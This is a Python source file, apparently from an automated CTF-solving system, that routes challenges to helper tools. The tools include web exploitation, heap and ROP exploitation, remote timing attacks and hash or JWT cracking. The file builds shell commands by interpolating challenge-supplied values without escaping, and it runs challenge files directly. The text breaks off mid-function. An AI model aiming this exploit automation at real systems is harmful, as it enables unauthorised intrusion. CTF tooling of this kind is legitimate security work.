"""Tool router node -- deterministic tool selection and cascade execution.

Runs pre-built helper tools with extracted parameters BEFORE the LLM-based
solve engine. If a tool finds the flag, short-circuits to flag_validator.

Tool metadata (which tools exist, their ordering, command styles) is loaded
from ``src/kraken/helpers/tool_meta.json`` via the registry.  To add a new
tool, edit *only* that JSON file.  If the JSON is missing or unreadable the
router falls back to hardcoded lists so production is never broken.
"""

from __future__ import annotations

import asyncio
import os
import re
import time
from pathlib import Path

from kraken.logging.structured import get_logger
from kraken.state import KrakenState
from kraken.storage.artifact_store import get_artifact

log = get_logger(__name__)

_HELPERS_DIR = Path(__file__).resolve().parent.parent / "helpers"

# Strategy-based timeout for tool execution
_TOOL_TIMEOUTS: dict[str, int] = {
    "constraint": 90,  # was 300 -- auto_angr can eat entire budget
    "crypto": 60,
    "keygen": 60,
    "dynamic": 90,
    "pwn": 120,  # pwn_solve/heap_exploit need more time
    "fuzzing": 120,  # was 300
    "web": 120,  # web exploitation needs time for SQLi/SSTI
    "firmware": 120,
    "forensics": 120,  # advanced forensics (memory dumps, disk images)
    "steg": 90,
    "scripting": 90,
    "misc": 180,  # bash solver scripts may install packages + run pipelines
    "blockchain": 180,  # solidity exploit generation + foundry build/test
}
_DEFAULT_TOOL_TIMEOUT = 60
_REMOTE_TOOL_TIMEOUT = 300

# ── Hardcoded fallback lists (used when tool_meta.json is missing) ───────
_FALLBACK_REMOTE_TOOLS = [
    "auto_remote_interact",
    "auto_timing_attack",
    "auto_service_interact",
    "auto_process_interact",
    "auto_web_exploit",
]

_FALLBACK_UNIVERSAL_TOOLS = [
    "auto_source_decode",
    "auto_constraint_extract",
    "auto_existing_exploits",
    "auto_run_static",
    "auto_python_reverse",
    "auto_c_source_eval",
    "auto_cpp_compile",
    "auto_qr_decode",
    "auto_maze_solver",
    "auto_archive_search",
    "auto_git_extract",
    "auto_table_reverse",
    "auto_ec_vigenere",
    "auto_hash_crack",
    "auto_pdf_extract",
    "auto_pcap_extract",
    "auto_steg_extract",
    "auto_file_carve",
    "auto_substitution_cipher",
    "auto_bash_solver",
]

_FALLBACK_TYPE_SPECIFIC: dict[str, list[str]] = {
    "constraint": [
        "auto_angr",
        "auto_angr_advanced",
        "auto_z3_decompile",
        "auto_regex_z3",
        "auto_gdb_cmp",
        "auto_gdb_solve",
        "auto_patcher",
    ],
    "crypto": [
        "auto_xor_brute",
        "auto_c_brute",
        "auto_c_rand",
        "auto_rsa_attack",
        "auto_lattice_attack",
        "auto_padding_oracle",
        "auto_tea_decrypt",
        "auto_prng_crack",
    ],
    "keygen": [
        "auto_angr",
        "auto_angr_advanced",
        "auto_z3_decompile",
        "auto_gdb_cmp",
        "auto_gdb_solve",
        "auto_c_brute",
        "auto_c_rand",
        "auto_patcher",
    ],
    "dynamic": [
        "auto_gdb_cmp",
        "auto_gdb_solve",
        "auto_angr",
        "auto_z3_decompile",
        "auto_dynamic_trace",
        "auto_memory_dump",
        "auto_vm_analyze",
        "auto_deobfuscate",
        "auto_patcher",
        "auto_tea_decrypt",
    ],
    "dotnet": ["auto_angr", "auto_deobfuscate", "auto_z3_decompile", "auto_patcher"],
    "pwn": [
        "auto_pwn_solve",
        "auto_heap_exploit",
        "auto_gdb_cmp",
        "auto_gdb_solve",
        "auto_pwn_template",
        "auto_rop_extract",
        "auto_process_interact",
        "auto_exploit_gen",
        "auto_libc_lookup",
        "auto_fuzz_harness",
    ],
    "forensics": [
        "auto_pcap_extract",
        "auto_steg_extract",
        "auto_file_carve",
        "auto_forensics_advanced",
    ],
    "steg": ["auto_steg_extract", "auto_file_carve", "auto_forensics_advanced"],
    "fuzzing": [
        "auto_angr",
        "auto_angr_advanced",
        "auto_gdb_solve",
        "auto_patcher",
        "auto_fuzz_harness",
    ],
    "web": [
        "auto_web_exploit",
        "auto_graphql_exploit",
        "auto_directory_scan",
        "auto_jwt_crack",
        "auto_padding_oracle",
        "auto_webhook_oob",
    ],
    "firmware": [
        "auto_deobfuscate",
        "auto_focused_decompile",
        "auto_gdb_solve",
        "auto_firmware_recon",
        "auto_dwarf_structs",
        "auto_memory_map",
        "auto_secrets_diff",
        "auto_unstripped_decompile",
        "auto_source_structs",
        "auto_source_structs_rust",
        "auto_ingress_contracts",
        "auto_serial_replay",
        "auto_patch_synth",
    ],
    "scripting": ["auto_vm_analyze", "auto_process_interact", "auto_pyjail"],
    "blockchain": ["auto_solidity_exploit"],
    "attack_defense": [
        "auto_existing_exploits",
        "auto_strip_recover",
        "auto_ingress_contracts",
        "auto_patch_synth",
        "auto_binary_patch",
        "auto_exploit_deployer",
        "auto_service_keeper",
        "auto_tick_orchestrator",
        "auto_ad_client",
    ],
}
_FALLBACK_DEFAULT_TYPE_SPECIFIC = [
    "auto_angr",
    "auto_angr_advanced",
    "auto_z3_decompile",
    "auto_gdb_cmp",
    "auto_gdb_solve",
    "auto_c_rand",
    "auto_dynamic_trace",
    "auto_deobfuscate",
    "auto_patcher",
]


# ── Registry-backed lists (with automatic fallback) ─────────────────────


def _load_from_registry() -> bool:
    """Attempt to load tool lists from the helpers registry.

    Returns True if the registry was loaded successfully.
    """
    try:
        from kraken.helpers.registry import (
            is_loaded,
        )

        if not is_loaded():
            return False
        return True
    except Exception:
        return False


def _get_universal_tools() -> list[str]:
    """Return universal tool list from registry, falling back to hardcoded."""
    try:
        from kraken.helpers.registry import get_universal_tools, is_loaded

        if is_loaded():
            tools = get_universal_tools()
            if tools:
                return tools
    except Exception:
        pass
    return list(_FALLBACK_UNIVERSAL_TOOLS)


def _get_type_specific() -> dict[str, list[str]]:
    """Return type-specific dict from registry, falling back to hardcoded."""
    try:
        from kraken.helpers.registry import get_all_type_specific, is_loaded

        if is_loaded():
            ts = get_all_type_specific()
            if ts:
                return ts
    except Exception:
        pass
    return {k: list(v) for k, v in _FALLBACK_TYPE_SPECIFIC.items()}


def _get_default_type_specific() -> list[str]:
    """Return default type-specific list from registry, falling back to hardcoded."""
    try:
        from kraken.helpers.registry import get_default_type_specific, is_loaded

        if is_loaded():
            d = get_default_type_specific()
            if d:
                return d
    except Exception:
        pass
    return list(_FALLBACK_DEFAULT_TYPE_SPECIFIC)


def _get_remote_tools() -> list[str]:
    """Return remote tool list from registry, falling back to hardcoded."""
    try:
        from kraken.helpers.registry import get_remote_tools, is_loaded

        if is_loaded():
            r = get_remote_tools()
            if r:
                return r
    except Exception:
        pass
    return list(_FALLBACK_REMOTE_TOOLS)


# Public aliases so existing imports (tests, optimizer) keep working.
# These are now dynamic properties backed by the registry.
_UNIVERSAL_TOOLS = _FALLBACK_UNIVERSAL_TOOLS
_TYPE_SPECIFIC = _FALLBACK_TYPE_SPECIFIC
_DEFAULT_TYPE_SPECIFIC = _FALLBACK_DEFAULT_TYPE_SPECIFIC
_REMOTE_TOOLS = _FALLBACK_REMOTE_TOOLS


def _build_generic_command(tool_name: str, state: KrakenState) -> str | None:
    """Build a command for tools whose command_style is 'dir_flag' or 'binary_flag'.

    This is the generic builder that eliminates boilerplate for simple tools
    that follow the pattern:
        python3 {helpers}/{tool}.py "{path}" [--flag-format "..."]

    Returns None if the required path is missing.
    """
    try:
        from kraken.helpers.registry import get_tool

        meta = get_tool(tool_name)
    except Exception:
        meta = None

    if meta is None:
        return None

    helpers_dir = str(_HELPERS_DIR)

    if meta.command_style == "dir_flag":
        challenge_dir = state.get("challenge_dir", "")
        if not challenge_dir:
            return None
        cmd = f'python3 {helpers_dir}/{tool_name}.py "{challenge_dir}"'
        if state.get("flag_format"):
            cmd += f' --flag-format "{state["flag_format"]}"'
        return cmd

    if meta.command_style == "binary_flag":
        binary_path = state.get("challenge_path", "")
        if not binary_path or os.path.isdir(binary_path):
            return None
        cmd = f'python3 {helpers_dir}/{tool_name}.py "{binary_path}"'
        if state.get("flag_format"):
            cmd += f' --flag-format "{state["flag_format"]}"'
        return cmd

    return None


# Map from tool name to custom builder function.  Tools that appear in this
# dict have command_style="custom" and need specialised argument handling.
_CUSTOM_BUILDERS: dict[str, object] = {}  # populated after function defs below


def _build_tool_command(tool_name: str, params: dict, state: KrakenState) -> str | None:
    """Build a command string for a tool given extracted parameters.

    Resolution order:
      1. Check _CUSTOM_BUILDERS for a dedicated builder function.
      2. Try the generic builder (dir_flag / binary_flag via registry).
      3. Return None (tool is skipped).
    """
    # 1. Custom builder?
    builder = _CUSTOM_BUILDERS.get(tool_name)
    if builder is not None:
        return builder(params, state)  # type: ignore[operator]

    # 2. Generic builder (dir_flag / binary_flag)?
    generic = _build_generic_command(tool_name, state)
    if generic is not None:
        return generic

    # 3. No builder found -- skip this tool
    return None


def _build_python_reverse_command(params: dict, state: KrakenState) -> str | None:
    """Build a command to reverse a Python-only challenge.

    Reads .py source files from challenge_files or decompiled_functions,
    and attempts to reverse the encoding/transformation.

    Prioritises solver scripts over handouts/generators/tests.
    When a solver script is found and archives (.7z, .zip, .tar.gz) exist
    in the challenge dir, extracts them first so the solver has access to
    the decompressed files (e.g. disk images for RAID recovery).
    """
    challenge_dir = state.get("challenge_dir", "")
    if not challenge_dir:
        return None

    # Find Python source files in the challenge directory
    py_files: list[tuple[str, str]] = []  # (name, path) pairs
    challenge_files = state.get("challenge_files", {})
    for name, info in challenge_files.items():
        if name.endswith(".py") and name.lower() not in ("challenge.json",):
            path = info.get("path", os.path.join(challenge_dir, name))
            py_files.append((name.lower(), path))

    if not py_files:
        return None

    # Skip names that are unlikely to be solvers (checked against FILENAME only)
    _SKIP_NAMES = {"handout", "gen", "generator", "demo", "example"}

    # Prioritise solver scripts (checked against both filename and full path)
    _SOLVER_NAMES = {"solver", "solve", "solution", "exploit", "crack", "decode", "decrypt", "sploit"}

    # Score and sort: solver scripts first, skip handouts
    scored: list[tuple[int, str]] = []
    for name, path in py_files:
        # Use only the filename (not parent dirs) for skip checks
        filename = name.rsplit("/", 1)[-1] if "/" in name else name
        filestem = filename.rsplit(".", 1)[0]
        # Use the full relative path for solver detection (catches test_solver/)
        fullstem = name.rsplit(".", 1)[0]
        # Skip handout/generator files (filename only)
        if any(skip in filestem for skip in _SKIP_NAMES):
            scored.append((-10, path))
            continue
        # Prefer solver scripts (check full path)
        if any(sol in fullstem for sol in _SOLVER_NAMES):
            scored.append((10, path))
            continue
        scored.append((0, path))

    scored.sort(key=lambda x: x[0], reverse=True)

    # Build archive extraction prefix if compressed archives exist
    # (solver scripts often expect decompressed files in the working dir)
    _ARCHIVE_EXTS = (".7z", ".zip", ".tar.gz", ".tgz", ".tar.bz2", ".tar")
    extract_cmds: list[str] = []
    for fname, info in challenge_files.items():
        fname_lower = fname.lower()
        if any(fname_lower.endswith(ext) for ext in _ARCHIVE_EXTS):
            fpath = info.get("path", os.path.join(challenge_dir, fname))
            if fname_lower.endswith(".7z"):
                extract_cmds.append(f'7z x "{fpath}" -o"{challenge_dir}" -y >/dev/null 2>&1')
            elif fname_lower.endswith(".zip"):
                extract_cmds.append(f'unzip -o "{fpath}" -d "{challenge_dir}" >/dev/null 2>&1')
            elif fname_lower.endswith((".tar.gz", ".tgz", ".tar.bz2", ".tar")):
                extract_cmds.append(f'tar xf "{fpath}" -C "{challenge_dir}" 2>/dev/null')

    extract_prefix = ""
    if extract_cmds:
        extract_prefix = " ; ".join(extract_cmds) + " ; "

    # Use the highest-scored file that isn't a skip
    for score, path in scored:
        if score >= -5:  # allow neutral (0) and positive
            # Run from challenge directory so relative paths in script work
            return f'cd "{challenge_dir}" && {extract_prefix}python3 "{path}"'

    # All files are skip-worthy; try the first one anyway
    return f'cd "{challenge_dir}" && {extract_prefix}python3 "{scored[0][1]}"'


def _build_c_source_eval_command(params: dict, state: KrakenState) -> str | None:
    """Build a command to evaluate C source arithmetic and convert to flag.

    Detects patterns like: long long a[] = { A * B }; where the products
    encode flag bytes as hex. Computes products and converts to ASCII.
    """
    challenge_dir = state.get("challenge_dir", "")
    if not challenge_dir:
        return None

    # Collect all .c source files in challenge files
    c_sources: list[str] = []
    challenge_files = state.get("challenge_files", {})
    for name, info in challenge_files.items():
        if name.endswith(".c") and "solver" not in name.lower():
            path = info.get("path", os.path.join(challenge_dir, name))
            if os.path.exists(path):
                c_sources.append(path)

    # Also check decompiled_functions for __source_ keys
    if not c_sources:
        for key, content in get_artifact(state, "decompiled_functions", "decompiled_functions_handle").items():
            if key.startswith("__source_") and key.endswith(".c__"):
                import tempfile

                with tempfile.NamedTemporaryFile(mode="w", suffix=".c", delete=False) as f:
                    f.write(content)
                    c_sources.append(f.name)
                break

    if not c_sources:
        return None

    helpers_dir = str(_HELPERS_DIR)
    # Try all C sources -- the tool exits on first success
    cmds = [f'python3 {helpers_dir}/auto_c_source_eval.py "{s}"' for s in c_sources]
    # Chain with ||: try first, if fails try next
    return " || ".join(cmds)


def _build_cpp_compile_command(params: dict, state: KrakenState) -> str | None:
    """Build a command to compile C/C++/ASM sources and optionally run for flags.

    Scans the challenge directory for Makefiles, .c, .cpp, .s files and
    attempts compilation.  After a successful build the binary is executed
    with common inputs to extract a flag.
    """
    challenge_dir = state.get("challenge_dir", "")
    if not challenge_dir:
        return None

    # Quick check: does the directory contain any compilable source?
    has_source = False
    challenge_files = state.get("challenge_files", {})
    for name in challenge_files:
        lower = name.lower()
        if lower in ("makefile", "gnumakefile", "cmakelists.txt", "build.sh", "compile.sh", "setup.sh"):
            has_source = True
            break
        if name.endswith((".c", ".cpp", ".cc", ".cxx", ".s", ".asm", ".S")):
            has_source = True
            break

    # Also scan directory directly in case challenge_files is incomplete
    if not has_source:
        try:
            for entry in os.listdir(challenge_dir):
                lower = entry.lower()
                if lower in ("makefile", "gnumakefile", "cmakelists.txt", "build.sh", "compile.sh", "setup.sh"):
                    has_source = True
                    break
                if entry.endswith((".c", ".cpp", ".cc", ".cxx", ".s", ".asm", ".S")):
                    has_source = True
                    break
        except OSError:
            pass

    if not has_source:
        return None

    helpers_dir = str(_HELPERS_DIR)
    cmd = f'python3 {helpers_dir}/auto_cpp_compile.py --dir "{challenge_dir}"'
    if state.get("flag_format"):
        # Extract prefix from flag_format (e.g. r"HTB\{[^}]+\}" -> "HTB")
        fmt = state["flag_format"]
        prefix = fmt.split("\\{")[0].split("{")[0].replace("\\", "")
        if prefix:
            cmd += f' --prefix "{prefix}"'
    return cmd


def _build_qr_decode_command(params: dict, state: KrakenState) -> str | None:
    """Build a command to decode QR code data from text files."""
    challenge_dir = state.get("challenge_dir", "")
    if not challenge_dir:
        return None

    # Look for QR-related text files by name or content pattern
    qr_file = None
    challenge_files = state.get("challenge_files", {})

    # Priority 1: files with "qr" in name
    for name, info in challenge_files.items():
        name_lower = name.lower()
        if "qr" in name_lower and (name_lower.endswith(".txt") or name_lower.endswith(".dat")):
            qr_file = info.get("path", os.path.join(challenge_dir, name))
            break

    # Priority 2: .txt files containing only decimal integers (QR bitmap pattern)
    if not qr_file:
        for name, info in challenge_files.items():
            if not name.lower().endswith(".txt"):
                continue
            preview = info.get("content_preview", "")
            if preview:
                lines = preview.strip().splitlines()[:5]
                if len(lines) >= 3 and all(l.strip().isdigit() for l in lines if l.strip()):
                    qr_file = info.get("path", os.path.join(challenge_dir, name))
                    break

    if not qr_file:
        return None

    helpers_dir = str(_HELPERS_DIR)
    return f'python3 {helpers_dir}/auto_qr_decode.py "{qr_file}"'


def _build_maze_solver_command(params: dict, state: KrakenState) -> str | None:
    """Build a command to solve maze challenges (PyTorch .pt or text)."""
    challenge_dir = state.get("challenge_dir", "")
    if not challenge_dir:
        return None

    # Look for .pt files (PyTorch maze) or maze-related text files
    maze_file = None
    challenge_files = state.get("challenge_files", {})

    for name, info in challenge_files.items():
        name_lower = name.lower()
        if name_lower.endswith(".pt"):
            maze_file = info.get("path", os.path.join(challenge_dir, name))
            break

    if not maze_file:
        # Check for maze text files
        for name, info in challenge_files.items():
            if "maze" in name.lower() and name.lower().endswith(".txt"):
                maze_file = info.get("path", os.path.join(challenge_dir, name))
                break

    if not maze_file:
        return None

    # Check challenge description for MD5 hint
    desc = state.get("challenge_description", "").lower()
    md5_flag = "--md5" if "md5" in desc else ""

    helpers_dir = str(_HELPERS_DIR)
    return f'python3 {helpers_dir}/auto_maze_solver.py "{maze_file}" {md5_flag}'.strip()


def _build_archive_search_command(params: dict, state: KrakenState) -> str | None:
    """Build a command to search archives for flags."""
    challenge_dir = state.get("challenge_dir", "")
    if not challenge_dir:
        return None

    # Find archive files in the challenge directory
    archive_exts = (".tar", ".tar.gz", ".tgz", ".zip", ".tar.bz2", ".7z")
    challenge_files = state.get("challenge_files", {})
    archives: list[str] = []

    for name, info in challenge_files.items():
        name_lower = name.lower()
        if any(name_lower.endswith(ext) for ext in archive_exts):
            path = info.get("path", os.path.join(challenge_dir, name))
            if os.path.exists(path):
                archives.append(path)

    if not archives:
        return None

    helpers_dir = str(_HELPERS_DIR)
    # Search all archives -- first success wins
    cmds = [f'python3 {helpers_dir}/auto_archive_search.py "{a}"' for a in archives]
    return " || ".join(cmds)


def _build_git_extract_command(params: dict, state: KrakenState) -> str | None:
    """Build a command to extract flags from git-based challenges (zip with .git)."""
    challenge_dir = state.get("challenge_dir", "")
    if not challenge_dir:
        return None

    # Find .zip files that might contain git repos
    challenge_files = state.get("challenge_files", {})
    zips: list[str] = []

    for name, info in challenge_files.items():
        if name.lower().endswith(".zip"):
            path = info.get("path", os.path.join(challenge_dir, name))
            if os.path.exists(path):
                zips.append(path)

    if not zips:
        return None

    helpers_dir = str(_HELPERS_DIR)
    cmds = [f'python3 {helpers_dir}/auto_git_extract.py "{z}"' for z in zips]
    return " || ".join(cmds)


def _build_table_reverse_command(params: dict, state: KrakenState) -> str | None:
    """Build a command to reverse substitution-table ciphers from C source."""
    challenge_dir = state.get("challenge_dir", "")
    if not challenge_dir:
        return None

    challenge_files = state.get("challenge_files", {})

    # Check for table header files
    has_table_h = any(re.search(r"table.*\.h$", name, re.IGNORECASE) for name in challenge_files)
    has_flag_h = any(re.search(r"flag.*\.h$", name, re.IGNORECASE) for name in challenge_files)

    if not (has_table_h and has_flag_h):
        # Also check C source files for #include patterns
        found = False
        for name, info in challenge_files.items():
            if name.endswith(".c"):
                path = info.get("path", os.path.join(challenge_dir, name))
                try:
                    src = open(path).read(2048)
                    if re.search(r'#include\s*".*table.*\.h"', src) and re.search(r'#include\s*".*flag.*\.h"', src):
                        found = True
                        break
                except OSError:
                    pass
        if not found:
            return None

    helpers_dir = str(_HELPERS_DIR)
    return f'python3 {helpers_dir}/auto_table_reverse.py "{challenge_dir}"'


def _build_ec_vigenere_command(params: dict, state: KrakenState) -> str | None:
    """Build a command to solve EC-Vigenere challenges."""
    challenge_dir = state.get("challenge_dir", "")
    if not challenge_dir:
        return None

    challenge_files = state.get("challenge_files", {})
    has_curve = False
    has_ciphertext = False

    for name, info in challenge_files.items():
        name_lower = name.lower()

        # Check for curve point operations in Python files
        if name_lower.endswith(".py"):
            path = info.get("path", os.path.join(challenge_dir, name))
            try:
                src = open(path).read(4096)
                if ("point_add" in src and "point_mul" in src) or ("topoint" in src and "frompoint" in src):
                    has_curve = True
            except OSError:
                pass

        # Check for ciphertext file with base64-semicolon pattern
        if name_lower in ("ciphertext", "ct", "encrypted", "output"):
            path = info.get("path", os.path.join(challenge_dir, name))
            try:
                data = open(path).read(200)
                if ";" in data and "=" in data:
                    has_ciphertext = True
            except OSError:
                pass

    if not (has_curve and has_ciphertext):
        return None

    helpers_dir = str(_HELPERS_DIR)
    return f'python3 {helpers_dir}/auto_ec_vigenere.py "{challenge_dir}"'


def _build_hash_crack_command(params: dict, state: KrakenState) -> str | None:
    """Build a command to crack password hashes from challenge text files."""
    challenge_dir = state.get("challenge_dir", "")
    if not challenge_dir:
        return None

    helpers_dir = str(_HELPERS_DIR)
    cmd = f'python3 {helpers_dir}/auto_hash_crack.py "{challenge_dir}"'
    if state.get("flag_format"):
        cmd += f' --flag-format "{state["flag_format"]}"'
    return cmd


def _build_pcap_extract_command(params: dict, state: KrakenState) -> str | None:
    """Build a command to extract flags from PCAP network captures."""
    challenge_dir = state.get("challenge_dir", "")
    if not challenge_dir:
        return None

    # Only run if .pcap/.pcapng files exist
    challenge_files = state.get("challenge_files", {})
    has_pcap = any(name.lower().endswith((".pcap", ".pcapng")) for name in challenge_files)
    if not has_pcap:
        return None

    helpers_dir = str(_HELPERS_DIR)
    cmd = f'python3 {helpers_dir}/auto_pcap_extract.py "{challenge_dir}"'
    if state.get("flag_format"):
        cmd += f' --flag-format "{state["flag_format"]}"'
    return cmd


def _build_steg_extract_command(params: dict, state: KrakenState) -> str | None:
    """Build a command to extract hidden data from images."""
    challenge_dir = state.get("challenge_dir", "")
    if not challenge_dir:
        return None

    # Only run if image files exist
    challenge_files = state.get("challenge_files", {})
    image_exts = (".png", ".jpg", ".jpeg", ".bmp", ".gif", ".tiff")
    has_image = any(name.lower().endswith(image_exts) for name in challenge_files)
    if not has_image:
        return None

    helpers_dir = str(_HELPERS_DIR)
    cmd = f'python3 {helpers_dir}/auto_steg_extract.py "{challenge_dir}"'
    if state.get("flag_format"):
        cmd += f' --flag-format "{state["flag_format"]}"'
    return cmd


def _build_file_carve_command(params: dict, state: KrakenState) -> str | None:
    """Build a command to carve embedded files and scan for flags."""
    challenge_dir = state.get("challenge_dir", "")
    if not challenge_dir:
        return None

    helpers_dir = str(_HELPERS_DIR)
    cmd = f'python3 {helpers_dir}/auto_file_carve.py "{challenge_dir}"'
    if state.get("flag_format"):
        cmd += f' --flag-format "{state["flag_format"]}"'
    return cmd


def _build_pwn_template_command(params: dict, state: KrakenState) -> str | None:
    """Build a command for automated pwn exploitation."""
    binary_path = state.get("challenge_path", "")
    if not binary_path or os.path.isdir(binary_path):
        return None

    helpers_dir = str(_HELPERS_DIR)
    cmd = f'python3 {helpers_dir}/auto_pwn_template.py "{binary_path}"'
    if state.get("flag_format"):
        cmd += f' --flag-format "{state["flag_format"]}"'
    return cmd


def _build_rop_extract_command(params: dict, state: KrakenState) -> str | None:
    """Build a command for ROP gadget extraction and chain suggestion."""
    binary_path = state.get("challenge_path", "")
    if not binary_path or os.path.isdir(binary_path):
        return None

    helpers_dir = str(_HELPERS_DIR)
    cmd = f'python3 {helpers_dir}/auto_rop_extract.py "{binary_path}"'
    if state.get("flag_format"):
        cmd += f' --flag-format "{state["flag_format"]}"'
    return cmd


def _build_one_gadget_command(params: dict, state: KrakenState) -> str | None:
    """Constraint-aware one_gadget selector.

    Uses state['libc_path'] (set by upstream libc lookup) and state['rop_budget']
    (set by classify_wrapper) to pick the cheapest one_gadget + prep chain.
    """
    libc_path = state.get("libc_path") or params.get("libc_path")
    if not libc_path:
        return None
    budget = params.get("budget_slots") or state.get("rop_budget") or 3
    regs = params.get("regs") or state.get("pivot_regs") or {}
    helpers_dir = str(_HELPERS_DIR)
    cmd = f'python3 {helpers_dir}/auto_one_gadget.py --libc "{libc_path}" --budget-slots {int(budget)}'
    if state.get("rbp_controlled") or params.get("rbp_controlled"):
        cmd += " --rbp-controlled"
    for reg, val in regs.items():
        cmd += f" --reg {reg}={val}"
    for mem in state.get("mem_nul") or params.get("mem_nul") or []:
        cmd += f' --mem-nul "{mem}"'
    return cmd


def _build_rop_offset_check_command(params: dict, state: KrakenState) -> str | None:
    """Cyclic-pattern ROP offset finder (local mode, via --break-at)."""
    binary = state.get("challenge_path") or params.get("binary")
    if not binary or os.path.isdir(binary):
        return None
    helpers_dir = str(_HELPERS_DIR)
    cmd = f'python3 {helpers_dir}/auto_rop_offset_check.py --binary "{binary}"'
    if state.get("libc_path"):
        cmd += f' --libc "{state["libc_path"]}"'
    if params.get("break_at") is not None:
        cmd += f" --break-at {hex(params['break_at'])}"
    if params.get("pre_file"):
        cmd += f' --pre-file "{params["pre_file"]}"'
    if params.get("overflow_len"):
        cmd += f" --overflow-len {int(params['overflow_len'])}"
    return cmd


def _build_classify_wrapper_command(params: dict, state: KrakenState) -> str | None:
    """Static wrapper classifier -- flags TIGHT_BUDGET fgets wrappers."""
    binary = state.get("challenge_path") or params.get("binary")
    if not binary or os.path.isdir(binary):
        return None
    helpers_dir = str(_HELPERS_DIR)
    return f'python3 {helpers_dir}/auto_classify_wrapper.py --binary "{binary}" --json'


def _build_reg_dump_command(params: dict, state: KrakenState) -> str | None:
    """ROP-chain generator for stack-dump/puts-leak exfil."""
    helpers_dir = str(_HELPERS_DIR)
    mode = params.get("mode", "puts")
    cmd = f"python3 {helpers_dir}/auto_reg_dump.py --mode {mode}"
    for key in (
        "pop_rdi",
        "pop_rsi",
        "pop_rsi_r15",
        "pop_rdx",
        "pop_rdx_r12",
        "pop_rax",
        "syscall_ret",
        "write_plt",
        "puts_plt",
        "ret",
    ):
        val = params.get(key)
        if val:
            cmd += f" --{key.replace('_', '-')} {hex(int(val))}"
    if params.get("target"):
        cmd += f" --target {hex(int(params['target']))}"
    if params.get("length"):
        cmd += f" --length {int(params['length'])}"
    return cmd


def _build_fifo_gdb_command(params: dict, state: KrakenState) -> str | None:
    """FIFO + GDB harness for timed-stage debugging."""
    binary = state.get("challenge_path") or params.get("binary")
    if not binary or os.path.isdir(binary):
        return None
    helpers_dir = str(_HELPERS_DIR)
    cmd = f'python3 {helpers_dir}/auto_fifo_gdb.py --binary "{binary}"'
    if state.get("libc_path"):
        cmd += f' --libc "{state["libc_path"]}"'
    for addr in params.get("breakpoints") or []:
        cmd += f" --break {hex(int(addr))}"
    for spec in params.get("stages") or []:
        cmd += f' --stage "{spec}"'
    cmd += " --json"
    return cmd


def _build_remote_interact_command(params: dict, state: KrakenState) -> str | None:
    """Build a command for general TCP service interaction."""
    remote_info = state.get("remote_info", {})
    host = remote_info.get("host")
    port = remote_info.get("port")
    if not host or not port:
        return None

    helpers_dir = str(_HELPERS_DIR)
    cmd = f'python3 {helpers_dir}/auto_remote_interact.py --host "{host}" --port {port}'
    if state.get("flag_format"):
        cmd += f' --flag-format "{state["flag_format"]}"'
    return cmd


def _build_timing_attack_command(params: dict, state: KrakenState) -> str | None:
    """Build a command for timing side-channel attack."""
    remote_info = state.get("remote_info", {})
    host = remote_info.get("host")
    port = remote_info.get("port")
    if not host or not port:
        return None

    helpers_dir = str(_HELPERS_DIR)
    cmd = f'python3 {helpers_dir}/auto_timing_attack.py --host "{host}" --port {port}'

    # Try to extract prefix/suffix from flag format
    flag_format = state.get("flag_format", "")
    prefix = params.get("flag_format_prefix", "")
    if not prefix and flag_format:
        prefix_m = re.match(r"([A-Za-z_]+)\\?\{", flag_format)
        if prefix_m:
            prefix = prefix_m.group(1) + "{"
    if prefix:
        cmd += f' --prefix "{prefix}"'
        cmd += ' --suffix "}"'

    # Charset from params or default
    charset = params.get("charset_range", "lowercase")
    cmd += f' --charset "{charset}"'

    # Body length from input_length minus prefix/suffix
    input_length = params.get("input_length")
    if input_length and prefix:
        body_len = input_length - len(prefix) - 1  # minus suffix
        if body_len > 0:
            cmd += f" --body-length {body_len}"

    cmd += " --concurrency 4 --timeout-per-char 10"

    # Timing-attack servers typically: no banner, raw byte comparison
    if params.get("timing_indicator"):
        cmd += " --no-banner --no-newline"

    if flag_format:
        cmd += f' --flag-format "{flag_format}"'

    return cmd


def _build_run_static_command(params: dict, state: KrakenState) -> str | None:
    """Run binary with no input and capture stdout -- catches static flag printers."""
    binary_path = state.get("challenge_path", "")
    if not binary_path or os.path.isdir(binary_path):
        return None
    if not os.access(binary_path, os.X_OK):
        if os.path.exists(binary_path):
            return f'timeout 5 /lib64/ld-linux-x86-64.so.2 "{binary_path}" < /dev/null 2>&1 || true'
        return None
    return f'timeout 5 "{binary_path}" < /dev/null 2>&1 || true'


def _build_c_rand_command(params: dict, state: KrakenState) -> str | None:
    """Build command for C random seed reversal."""
    seed = params.get("random_seed")
    uses_random = params.get("uses_random")
    if not seed or not uses_random:
        return None
    helpers_dir = str(_HELPERS_DIR)
    count = params.get("input_length") or params.get("loop_bound") or 64
    cmd = f"python3 {helpers_dir}/auto_c_rand.py --seed {seed} --count {count}"
    binary_path = state.get("challenge_path", "")
    if binary_path and not os.path.isdir(binary_path):
        cmd += f' --binary "{binary_path}"'
    prefix = params.get("flag_format_prefix") or ""
    if prefix:
        cmd += f' --prefix "{prefix}"'
    return cmd


def _build_angr_command(params: dict, state: KrakenState) -> str | None:
    """Build command for angr symbolic execution."""
    binary_path = state.get("challenge_path", "")
    if not binary_path or os.path.isdir(binary_path):
        return None
    helpers_dir = str(_HELPERS_DIR)
    success = params.get("success_string")
    if not success:
        for s in state.get("strings_of_interest", []):
            sl = s.lower()
            if any(w in sl for w in ["correct", "success", "win", "right", "good", "congrat", "yes"]):
                success = s.strip()
                break
    if not success:
        return None
    cmd = f'python3 {helpers_dir}/auto_angr.py "{binary_path}" --find "{success}"'
    length = params.get("input_length")
    if length:
        cmd += f" --length {length}"
    fail = params.get("fail_string")
    if fail:
        cmd += f' --avoid "{fail}"'
    if params.get("input_mode") == "arg":
        cmd += " --arg"
    return cmd


def _build_regex_z3_command(params: dict, state: KrakenState) -> str | None:
    """Build command for Z3 constraint solving."""
    binary_path = state.get("challenge_path", "")
    if not binary_path or os.path.isdir(binary_path):
        return None
    helpers_dir = str(_HELPERS_DIR)
    workspace = state.get("solve_workspace") or state.get("challenge_dir", "")
    decompile_path = os.path.join(workspace, "decompile.c") if workspace else None
    if not decompile_path or not os.path.exists(decompile_path):
        return None
    length = params.get("input_length") or params.get("loop_bound") or 40
    return f'python3 {helpers_dir}/auto_regex_z3.py "{decompile_path}" --length {length}'


def _build_gdb_cmp_command(params: dict, state: KrakenState) -> str | None:
    """Build command for GDB byte-by-byte comparison."""
    binary_path = state.get("challenge_path", "")
    if not binary_path or os.path.isdir(binary_path):
        return None
    helpers_dir = str(_HELPERS_DIR)
    test_input = (params.get("flag_format_prefix") or "") + "A" * 20
    if not test_input:
